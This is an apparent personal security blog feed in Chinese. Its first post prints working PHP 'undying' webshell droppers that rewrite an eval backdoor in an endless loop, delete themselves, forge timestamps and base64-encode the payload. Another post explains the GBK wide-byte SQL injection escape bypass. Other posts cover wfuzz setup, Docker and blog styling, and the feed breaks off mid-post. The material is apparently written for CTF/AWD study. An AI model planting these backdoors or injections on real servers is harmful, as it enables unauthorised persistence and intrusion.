<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Unixcs</title>
  
  <subtitle>Be the Master of Time!</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://unixcs.com/"/>
  <updated>2019-08-05T02:49:06.690Z</updated>
  <id>http://unixcs.com/</id>
  
  <author>
    <name>Unixcs</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>不死马</title>
    <link href="http://unixcs.com//article/2019-08-05/1/"/>
    <id>http://unixcs.com//article/2019-08-05/1/</id>
    <published>2019-08-05T02:40:38.000Z</published>
    <updated>2019-08-05T02:49:06.690Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="什么是不死马">什么是不死马？</span></h2><p><strong>内存马</strong>，通俗讲就是不死马，就是会运行一段永远不退出的程序常驻在PHP进程里，无限执行。</p><a id="more"></a><h2><span id="生成过程">生成过程</span></h2><p>不死马.php  →  上传到server  →  server执行文件  →  server本地无限循环生成 (一句话.php) </p><h2><span id="两种不死马">两种不死马</span></h2><ul><li>网上流传的不死马</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">$file = <span class="string">'2.php'</span>;</span><br><span class="line">$code = <span class="string">'&lt;?php if(md5($_GET["pass"])=="1a1dc91c907325c69271ddf0c944bc72")&#123;@eval($_POST[a]);&#125; ?&gt;'</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    file_put_contents($file,$code);</span><br><span class="line">    system(<span class="string">'touch -m -d "2018-12-01 09:10:12" .2.php'</span>);</span><br><span class="line">    usleep(<span class="number">5000</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol><li><code>ignore_user_abort(true);</code><br>函数设置与客户机断开是否会终止脚本的执行。这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。</li><li><code>set_time_limit()</code><br>函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。</li><li><code>unlink(__FILE__)</code><br>删除文件本身，以起到隐蔽自身的作用。</li><li><code>while</code><br>循环内每隔usleep(5000)即写新的后门文件</li><li><code>system()</code><br>执行的命令用于修改文件的创建或修改时间，可以绕过“find –name &#39;*.php&#39; –mmin -10”命令检测最近10分钟修改或新创建的PHP文件，但不一定有用，可选。</li></ol><ul><li>升级版</li></ul><p>网上流传的不死马, while 里面只是并没有判断了这个文件是不是存在 ,<br>那么我只需要把这个文件中的 shell 注释掉就可以绕过你的内存木马了.</p><p>正确的姿势应该是这样 :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line"> set_time_limit(<span class="number">0</span>);</span><br><span class="line"> $file = <span class="string">'c.php'</span>;</span><br><span class="line"> $code = base64_decode(<span class="string">'PD9waHAgZXZhbCgkX1BPU1RbY10pOz8+'</span>);</span><br><span class="line"> <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">     <span class="keyword">if</span>(md5(file_get_contents($file))===md5($code)) &#123;</span><br><span class="line">         file_put_contents($file, $code);</span><br><span class="line">     &#125;</span><br><span class="line">     usleep(<span class="number">50</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><p>参考:<a href="https://xz.aliyun.com/t/1530/" target="_blank" rel="noopener">https://xz.aliyun.com/t/1530/</a><br>  <a href="https://blog.csdn.net/ski_12/article/details/84920127" target="_blank" rel="noopener">https://blog.csdn.net/ski_12/article/details/84920127</a></p><br><h2><span id="拓展">拓展</span></h2><h3><span id="一句话木马">一句话木马</span></h3><p>参考：<a href="https://www.uedbox.com/post/6051/" target="_blank" rel="noopener">https://www.uedbox.com/post/6051/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;什么是不死马？&quot;&gt;&lt;a href=&quot;#什么是不死马？&quot; class=&quot;headerlink&quot; title=&quot;什么是不死马？&quot;&gt;&lt;/a&gt;什么是不死马？&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;内存马&lt;/strong&gt;，通俗讲就是不死马，就是会运行一段永远不退出的程序常驻在PHP进程里，无限执行。&lt;/p&gt;
    
    </summary>
    
    
      <category term="awd" scheme="http://unixcs.com/tags/awd/"/>
    
  </entry>
  
  <entry>
    <title>代码高亮</title>
    <link href="http://unixcs.com//article/2019-08-02/1/"/>
    <id>http://unixcs.com//article/2019-08-02/1/</id>
    <published>2019-08-02T03:35:20.000Z</published>
    <updated>2019-08-02T04:33:45.213Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="前言">前言</span></h3><p>之前的博客代码块没有对代码设置<code>高亮</code>，看起来就很不舒服，所以还是自己动手改改吧~</p><a id="more"></a><h2><span id="原代码">原代码</span></h2><p>首先要找到高亮代码的位置，一顿摸索后····<br>不出意外的找到了代码文件位置<code>/source/css/_partial/layout.styl</code></p><p>整体代码太多我就不往上放了<br>附上代码块的关键代码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">figure.highlight</span><br><span class="line">    display: block</span><br><span class="line">    width: 92%</span><br><span class="line">    margin: auto</span><br><span class="line">    overflow-x: auto</span><br><span class="line"></span><br><span class="line">.highlight &gt; table</span><br><span class="line">    background: #f2f2f2</span><br><span class="line">    width: 100%</span><br><span class="line"></span><br><span class="line">figure.highlight, .code, code</span><br><span class="line">    font-family: Monaco, Menlo, Consolas, 'Microsoft Yahei', monospace</span><br><span class="line">    background: #eee</span><br><span class="line">    color: #f14e32</span><br><span class="line">    font-size: 14px</span><br><span class="line">    margin: auto 5px</span><br><span class="line">    pre</span><br><span class="line">        // width: 90%</span><br><span class="line">        color: #4a4a4a   </span><br><span class="line">        //background: #eee</span><br><span class="line">        margin: auto   </span><br><span class="line">        overflow-x: auto</span><br><span class="line">        font-family: inherit</span><br><span class="line">        font-size: 13px</span><br><span class="line">        line-height: 1.6em</span><br></pre></td></tr></table></figure><p>对 <code>单行代码</code> 和 <code>代码块</code> 添加:<strong>字体颜色、背景色、圆角、阴影</strong></p><h2><span id="修改后">修改后</span></h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">figure.highlight//代码块</span><br><span class="line">    <span class="selector-tag">display</span>: <span class="selector-tag">block</span></span><br><span class="line">    <span class="selector-tag">width</span>: 92%</span><br><span class="line">    <span class="selector-tag">margin</span>: <span class="selector-tag">auto</span></span><br><span class="line">    <span class="selector-tag">overflow-x</span>: <span class="selector-tag">auto</span></span><br><span class="line">    box-shadow:2px 2px 5px #918f8f52//盒子阴影</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.highlight &gt; table//代码序号背景</span><br><span class="line">    <span class="selector-tag">background</span>: <span class="selector-id">#f2f2f2</span></span><br><span class="line">    <span class="selector-tag">width</span>: 100%</span><br><span class="line"></span><br><span class="line">figure.highlight, .code, code//单行代码</span><br><span class="line">    font-family: Monaco, Menlo, Consolas, 'Microsoft Yahei', monospace</span><br><span class="line">    <span class="selector-tag">background</span>: <span class="selector-id">#eee</span></span><br><span class="line">    box-shadow:2px 2px 5px #E2E2E2  //盒子阴影</span><br><span class="line">    border-radius:3px;              //圆角</span><br><span class="line">    <span class="selector-tag">color</span>: <span class="selector-id">#c7254e</span></span><br><span class="line">    font-size: 14px //单行代码字体</span><br><span class="line">    <span class="selector-tag">margin</span>: <span class="selector-tag">auto</span> 5<span class="selector-tag">px</span></span><br><span class="line">    <span class="selector-tag">pre</span></span><br><span class="line">        // width: 90%</span><br><span class="line">        <span class="selector-tag">color</span>: <span class="selector-id">#4a4a4a</span></span><br><span class="line">        //background: #eee</span><br><span class="line">        <span class="selector-tag">margin</span>: <span class="selector-tag">auto</span></span><br><span class="line">        <span class="selector-tag">overflow-x</span>: <span class="selector-tag">auto</span></span><br><span class="line">        <span class="selector-tag">font-family</span>: <span class="selector-tag">inherit</span></span><br><span class="line">        <span class="selector-tag">font-size</span>: 13<span class="selector-tag">px</span></span><br><span class="line">        <span class="selector-tag">line-height</span>: 1<span class="selector-class">.6em</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;之前的博客代码块没有对代码设置&lt;code&gt;高亮&lt;/code&gt;，看起来就很不舒服，所以还是自己动手改改吧~&lt;/p&gt;
    
    </summary>
    
    
      <category term="blog" scheme="http://unixcs.com/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>宽字节注入</title>
    <link href="http://unixcs.com//article/2019-06-27/1/"/>
    <id>http://unixcs.com//article/2019-06-27/1/</id>
    <published>2019-06-27T08:39:48.000Z</published>
    <updated>2019-08-04T06:33:33.873Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="前言">前言</span></h3><p>如何解决 注入时 输入的  &nbsp;&nbsp; <strong><code>&#39;</code></strong>(单引号) &nbsp;&nbsp; 被转义成 &nbsp;&nbsp; <strong><code>\&#39;</code></strong>(反斜杠+单引号)</p> <a id="more"></a>  <br> <br><ol><li>首先我们来看一下sql注入中遇到的问题</li></ol><p><img src="https://unixcs.oss-cn-beijing.aliyuncs.com/img/1111.jpg" alt="单引号被转义"></p><p>遇到这种情况，说明单引号在插入时被转义了，那么如何去bypass？</p> <br> <br><ol start="2"><li>使用宽字节注入，把单引号前的\给消除掉，这样就可以正常使用单引号去闭合了</li></ol><p><img src="https://unixcs.oss-cn-beijing.aliyuncs.com/img/222.jpg" alt="宽字节注入"></p><p>这里使用的方法是在单引号前面加上<strong>%df</strong>。</p><p>关于为什么要加上%df就可以宽字节注入了呢？请听我娓娓道来~</p> <br> <br><p><font color="gray" size="3">单引号前被插入了   \   说明php源码代码中出现了以下函数，那么首先我们要了解一下这些函数。</font></p><h3><span id="php转义函数">PHP转义函数</span></h3><ul><li><p>addslashes，</p></li><li><p>mysql_real_escape_string，</p></li><li><p>mysql_escape_string</p><br><br></li></ul><h3><span id="宽字节注入条件">宽字节注入条件：</span></h3><ol><li><p>使用addslashes函数  (并且开启GPC)</p></li><li><p>数据库编码设置为GBK   (php编码为 utf-8 或其它非GBK格式)</p><br><br></li></ol><h3><span id="宽字节注入流程">宽字节注入流程：</span></h3><ol><li>正常被转义：</li></ol><p><strong>‘</strong>  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   –&gt;  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;    <strong>\‘</strong>   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(单引号 -&gt; 反斜杠+单引号)</p><ol start="2"><li>加%df 宽字节注入过滤:</li></ol><p><strong>%df’</strong> &nbsp;&nbsp; –&gt; &nbsp;&nbsp;<strong>%df%27%</strong> –&gt; &nbsp;&nbsp;<strong>%df%5c%27</strong> &nbsp;&nbsp; –&gt;  &nbsp;&nbsp;<strong>運’</strong></p><p>浏览器输入 –&gt; url编码  &nbsp;&nbsp;&nbsp; –&gt; addslashes转义 &nbsp;&nbsp; –&gt; %df%5c被转义成汉字 <code>運</code></p> <br> <br><h3><span id="宽字节注入原理">宽字节注入原理：</span></h3><ol><li><strong>%df%5c 为什么会被转义成为汉字 <code>運</code> 呢？</strong></li></ol><p>%df’经过addslashes编码之后带入了‘\’</p><p>%df’ 就变成了 %df&#39; –&gt;  %df%5c%27 (url编码后)</p><p>%df%5c%27 在带入到mysql时使用了GBK，%df%5c被转译成汉字<code>運</code> so最后输出结果为 <code>運&#39;</code></p> <br> <br><ol start="2"><li><strong>讲到GBK编码转义 为什么%df%5c%27 只转义%5c而不转义%27 呢?</strong></li></ol><p>GBK编码，它的编码范围是0x8140~0xFEFE（不包括xx7F），<br>在遇到 %df(ascii(223)) &gt; ascii(128) 时自动拼接%5c，<br>因此吃掉‘\’，而%27、%20小于ascii(128)的字符就保留了。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;如何解决 注入时 输入的  &amp;nbsp;&amp;nbsp; &lt;strong&gt;&lt;code&gt;&amp;#39;&lt;/code&gt;&lt;/strong&gt;(单引号) &amp;nbsp;&amp;nbsp; 被转义成 &amp;nbsp;&amp;nbsp; &lt;strong&gt;&lt;code&gt;\&amp;#39;&lt;/code&gt;&lt;/strong&gt;(反斜杠+单引号)&lt;/p&gt;
    
    </summary>
    
    
      <category term="Web安全" scheme="http://unixcs.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>about study</title>
    <link href="http://unixcs.com//article/2019-06-19/1/"/>
    <id>http://unixcs.com//article/2019-06-19/1/</id>
    <published>2019-06-19T08:53:27.000Z</published>
    <updated>2019-07-10T12:57:58.841Z</updated>
    
    <content type="html"><![CDATA[<h4><span id="前言">前言</span></h4><p><strong>你的间接性努力就是为了缓解持续性堕落带给你的焦虑而存在的</strong></p><a id="more"></a><br><h4><span id="最近状态">最近状态</span></h4><p>前段时间在知乎看到一篇关于自律的文章，里面谈到有一种努力叫做<code>间接性努力</code>。回想自己这段时间的状态，总是被动的去学习，每天生活看似充实但实际上却是<del>瞎几把</del>努力！没有任何用。<br>时间都浪费在琐碎事上去了，本来在学一个新的知识点，发现手机屏幕亮了，就不由自主的拿起手机刷了起来，再回过头来时发现时间已经过去大半，刚才那个知识点还没看完却又已忘的差不多了。<br>周末无聊时总是沉浸在游戏直播，手机app里，压根就没有想到过去学一点东西。喜欢这种短暂的快感,一时的享受。晚上睡觉前想起自己这样的一天时，又开始懊悔不已。。如此往复,周而复始，恶性循环！</p><p>总结：<code>没有目标，缺少努力的动力</code>；<code>漫无目的，逮到什么学什么，看似学了很多，实际都是无用功</code>；<code>容易分心，缺乏自律！</code></p><h4><span id="如何改变">如何改变</span></h4><ol><li><strong>制定目标</strong>(由大到小，细化目标)</li><li><strong>找到自己真实的发自内心的兴趣点</strong>(兴趣才是最好的老师)</li><li><strong>自律！约束自己!!</strong>(该学学该玩玩，but学的时候一定不能玩！)</li></ol><br><br><h4><span id="flag">flag</span></h4><p>给自己定个小目标，这个月剩下的这几天，把之前落下的视频 基础-进阶 全部补完！<br>争取下个月开始do a Bug Bounty Hunters</p><p><strong>学习从来都不是一件轻松的事情，但也要学会苦中作乐，去享受学习的过程~</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;你的间接性努力就是为了缓解持续性堕落带给你的焦虑而存在的&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Study" scheme="http://unixcs.com/tags/Study/"/>
    
  </entry>
  
  <entry>
    <title>Windous下Wfuzz的安装</title>
    <link href="http://unixcs.com//article/2019-06-13/1/"/>
    <id>http://unixcs.com//article/2019-06-13/1/</id>
    <published>2019-06-13T12:07:54.000Z</published>
    <updated>2019-08-02T04:22:12.390Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="0x00">0x00</span></h2><p><strong>前言</strong><br>wfuzz这个工具在kali下是默认安装的~ 可是由于虚拟机用kali总是有种卡卡的感觉，就想着在windous下也装一个。<br>其实之前我尝试安装过几次，因为没学过python，就一直没有装成功。。<del>还是因为自己菜</del><br>终于！！！趁着今天下午没事，在 你好表哥 的帮助下~ 终于把这个史诗级的难题给solve了<br> <a id="more"></a> </p><br><br><hr><p>关于wfuzz的安装这里介绍<strong>两种方法</strong></p><ol><li>基于python2.7环境安装</li><li>exe版 免python环境，打开即用！！   <del>早知道有这个版本,我TM还费那么大劲去配置那些看着就脑壳疼的环境干嘛！</del></li></ol><br><br><h2><span id="0x01-ensp基于python27环境安装wufzz">0x01 &ensp;<strong>基于python2.7环境安装wufzz</strong></span></h2><p>首先你要有python2.7+pip的环境，这里环境的安装就不多介绍了~ 直接进入正题</p><p><a href="https://github.com/xmendez/wfuzz/archive/v2.3.4.tar.gz" target="_blank" rel="noopener">下载wfuzz</a></p><p>cmd进入文件根目录 <code>cd wfuzz-2.3.4</code> </p><p>①<code>setup.py install</code></p><p>②<code>pip install -r requirements.txt</code></p><p>③<code>pip install wfuzz</code></p><blockquote><p>① setup.py是<strong>安装程序</strong><br>② requirements.txt 文件是python项目中必须包含一个文件用于记录所有依赖包及其精确的版本号用以新环境部署。<strong>这里是安装依赖包</strong><br>③ <strong>安装wfuzz</strong></p></blockquote><br><p>到这里wfuzz就安装成功了，如何去验证是否安装成功呢？</p><p>在cmd下输入<code>wfuzz</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\unixcs\Desktop\wfuzz-2.3.4&gt;wfuzz</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.4 - The Web Fuzzer                           *</span><br><span class="line">*                                                      *</span><br><span class="line">* Version up to 1.4c coded by:                         *</span><br><span class="line">* Christian Martorella (cmartorella@edge-security.com) *</span><br><span class="line">* Carlos del ojo (deepbit@gmail.com)                   *</span><br><span class="line">*                                                      *</span><br><span class="line">* Version 1.4d to 2.4 coded by:                        *</span><br><span class="line">* Xavier Mendez (xmendez@edge-security.com)            *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Usage:  wfuzz [options] -z payload,params &lt;url&gt;</span><br><span class="line"></span><br><span class="line">        FUZZ, ..., FUZnZ  wherever you put these keywords wfuzz will replace them with the values of the specified payload.</span><br><span class="line">        FUZZ&#123;baseline_value&#125; FUZZ will be replaced by baseline_value. It will be the first request performed and could be used as a base for filtering.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">        wfuzz -c -z file,users.txt -z file,pass.txt --sc 200 http://www.site.com/log.asp?user=FUZZ&amp;pass=FUZ2Z</span><br><span class="line">        wfuzz -c -z range,1-10 --hc=BBB http://www.site.com/FUZZ&#123;something not there&#125;</span><br><span class="line">        wfuzz --script=robots -z list,robots.txt http://www.webscantest.com/FUZZ</span><br><span class="line"></span><br><span class="line">Type wfuzz -h for further information or --help for advanced usage.</span><br></pre></td></tr></table></figure><br><br><h2><span id="0x02-enspexe版本的安装">0x02  &ensp;<strong>exe版本的安装</strong></span></h2><ul><li>下载<br><a href="https://github.com/xmendez/wfuzz/releases/download/v2.1-beta/wfuzz_2.1_windows.zip" target="_blank" rel="noopener">下载wfuzz</a></li></ul><ul><li>打开<br><img src="https://s2.ax1x.com/2019/06/13/Vhtg10.png" alt="wfuzz运行路径"></li></ul><ul><li>运行</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">wfuzz.exe -w 1.txt www.baidu.com/FUZZ</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.1 - The Web Bruteforcer                      *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://www.baidu.com/FUZZ</span><br><span class="line">Total requests: 4</span><br><span class="line"></span><br><span class="line">==================================================================</span><br><span class="line">ID      Response   Lines      Word         Chars          Request</span><br><span class="line">==================================================================</span><br><span class="line"></span><br><span class="line">00000:  C=302      7 L        18 W          222 Ch        "2"</span><br><span class="line">00001:  C=302      7 L        18 W          222 Ch        "3"</span><br><span class="line">00002:  C=302      7 L        18 W          222 Ch        "4"</span><br><span class="line">00003:  C=302      7 L        18 W          222 Ch        "1"</span><br><span class="line"></span><br><span class="line">Total time: 0.296999</span><br><span class="line">Processed Requests: 4</span><br><span class="line">Filtered Requests: 0</span><br><span class="line">Requests/sec.: 13.46801</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00&quot;&gt;&lt;/a&gt;0x00&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;前言&lt;/strong&gt;&lt;br&gt;wfuzz这个工具在kali下是默认安装的~ 可是由于虚拟机用kali总是有种卡卡的感觉，就想着在windous下也装一个。&lt;br&gt;其实之前我尝试安装过几次，因为没学过python，就一直没有装成功。。&lt;del&gt;还是因为自己菜&lt;/del&gt;&lt;br&gt;终于！！！趁着今天下午没事，在 你好表哥 的帮助下~ 终于把这个史诗级的难题给solve了&lt;br&gt;
    
    </summary>
    
    
      <category term="Tools" scheme="http://unixcs.com/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>Docker</title>
    <link href="http://unixcs.com//article/2019-06-11/1/"/>
    <id>http://unixcs.com//article/2019-06-11/1/</id>
    <published>2019-06-11T06:21:44.000Z</published>
    <updated>2019-08-04T08:47:56.886Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="0x00">0x00</span></h2><p><strong>前言</strong><br>好久没更新博客了，感觉每天都在虚度光阴，要给自己指定一个学习计划，让自己忙起来！！<br>记一下最近刚接触的doker吧，把笔记知识点汇总一下。</p> <a id="more"></a> <h2><span id="0x01">0x01</span></h2><p><strong>Dcoker 是什么？？</strong></p><p><img src="https://unixcs.oss-cn-beijing.aliyuncs.com/img/docker.jpg" alt></p><p>Docker的思想来自于<code>集装箱</code>，集装箱解决了什么问题？<br>在一艘大船上，可以把货物规整的摆放起来。<br>并且各种各样的货物被集装箱标准化了，集装箱和集装箱之间不会互相影响。<br>那么我就不需要专门运送水果的船和专门运送化学品的船了。<br>只要这些货物在集装箱里封装的好好的，那我就可以用一艘大船把他们都运走。</p><br><br><blockquote><p>还不懂什么是docker？那就看看这两个生动形象通俗易懂的例子吧<br><a href="https://my.oschina.net/jamesview/blog/2994112" target="_blank" rel="noopener">Case1</a><br><a href="https://www.jianshu.com/p/8cccc39c9f1c" target="_blank" rel="noopener">Case2</a> </p></blockquote><br><br><br><h4><span id="镜像image和容器container">镜像（image）和容器（container）</span></h4><p>讲docker 之前必须要提的两个词 <strong>镜像</strong> and <strong>容器</strong></p><p>那么什么是镜像？什么又是容器呢？ </p><h4><span id="容器">容器</span></h4><p>通俗来讲容器就是装东西的箱子，你可以把它理解为 <strong>集装箱</strong><br>容器好比软件集装箱，它内部可以安装任何软件和库文件，做任意的运行环境配置。</p><ul><li>镜像是静态的。</li><li>一个镜像可以创建多个容器。</li></ul><h4><span id="镜像">镜像</span></h4><p>你可以把镜像看成是我们电脑的里面的 <strong>软件安装包</strong><br>Docker运行容器前需要本地存在对应的镜像，一个镜像可以创建多个容器，</p><ul><li>容器是动态的。</li><li>镜像对于容器只是可读的。</li></ul><br><br><h2><span id="0x02">0x02</span></h2><p><strong>搭建docker主要流程：</strong></p><p><strong>找镜像(search) -&gt; 下镜像(pull) -&gt; 查看镜像(images) -&gt; 镜像中创建容器(run) -&gt; 查看容器(ps)</strong></p><hr><p>我用的是centos7搭建的docker<br>检查centos版本是否支持docker</p><p>1.查看内核版本 (是否大于3.10)<br><code>uname -r</code> </p><p>2.安装docker<br><code>yum -y install docker</code><br>安装最新版本<br><code>yum -y install docker-ce</code><br><em>安装出现问题</em>–&gt;<a href="https://blog.csdn.net/xixiworld/article/details/71438794" target="_blank" rel="noopener">文章</a></p><p>yum install  docker-ce-<version_string> (指定安装版本) </version_string></p><p><code>systemctl start docker</code>     开启docker<br><code>systemctl enable docker</code>    开机启动<br><code>docker version</code>             查看docker版本号</p><p>3.验证是否安装成功</p><p><code>docker run hello-world</code></p><blockquote><p>到这里其实docker已经安装好了，但！安装好仅仅只是第一步骤；<br>后面还要下载所需的镜像或者使用dockerfile自行构建docker镜像；<br>最后再部署安装你的应用程序到docker容器中。</p></blockquote><br><h2><span id="一-镜像">一. 镜像</span></h2><p>下载CentOS7 镜像<br><code>docker pull centos</code></p><p><strong>安装时遇到的问题</strong><br>x509: certificate has expired or is not yet valid错误解决</p><p>这个问题基本上是因为证书出现过期导致。</p><p><strong>解决办法</strong><br>查看虚拟机和远程服务器的时间是否同步：<br>👇👇<br><code>date</code><br>若时间不同步，执行<br><code>ntpdate cn.pool.ntp.org</code><br>若安装失败 检查是否安装了ntpate<br><code>yum install ntpdate -y</code> </p><h4><span id="镜像命令">镜像命令</span></h4><p>1.搜索镜像<br>docker search 关键词</p><p>2.获取镜像<br>docker pull 仓库名称[:tag]</p><p>3.查看镜像<br><code>docker images</code>         </p><p>4.删除镜像<br><code>docker rmi [image id]</code><br><code>docker rmi [tag]</code>  //仓库名</p><blockquote><p>使用 <strong>docker rmi [id]</strong> 命令时，必须确保该镜像没有被容器使用才能进行;<br>删除时系统会先删除掉指向该镜像的所有标签，然后删除镜像本身。</p></blockquote><p>5.存出镜像和载入镜像</p><p>docker save -o 存储文件名 存储的镜像</p><br><h2><span id="二容器">二.容器</span></h2><p>1.创建容器<br><code>docker create</code><br><code>docker run</code>        //创建并启动容器  </p><p>2.查看容器<br><code>docker ps</code><br><code>docker ps -a</code>             //    查看所有docker</p><p>3.启动/终止容器<br><code>docker start [names]</code><br><code>docker stop [names]</code></p><p>4.删除容器     </p><ul><li><p>终止状态的容器<br><code>docker rm [CONTAINER ID]</code></p></li><li><p>正在运行的容器<br><code>docker rm -f [CONTAINER ID]</code></p></li></ul><p>5.进入容器<br><code>docker exec -it [name] bash</code>          进入容器<br><code>docker run -i -t centos /bin/bash</code>     创建centos</p><blockquote><p>exec是进入已经存在的容器，run是创建新容器 </p></blockquote><p>5.退出容器<br><code>ctrl+d</code> 退出容器且关闭</p><p><code>ctrl+p+q</code> 退出容器但不关闭</p><p><code>docker kill -s HUP [容器名]</code></p><blockquote><p>HUP(1)是让进程挂起，睡眠;<br>kill (9)六亲不认的杀掉<br>term(15)正常的退出进程</p></blockquote><br><br><hr><h2><span id="0x03">0x03</span></h2><p>docker logs errors and others</p><p>遇到问题、运行不了之类的先看日志报错信息!<br></p><h4><span id="1-exited-1-错误">1. Exited (1) 错误</span></h4><p>这个报错信息 是我在使用php镜像创建一个新的容器时出现的，当时只知道傻乎乎的的去百度搜，不知道查看docker logs 报错，导致走了很长的弯路！<br>错误原因： php的配置文件里 server 被我打成了erver ，发现这个错误的时候 我真的是想把自己揍一顿(<del>复制粘贴都能错</del>)</p><p>总结：    细心细心再细心！！</p><p><strong>docker los 命令</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 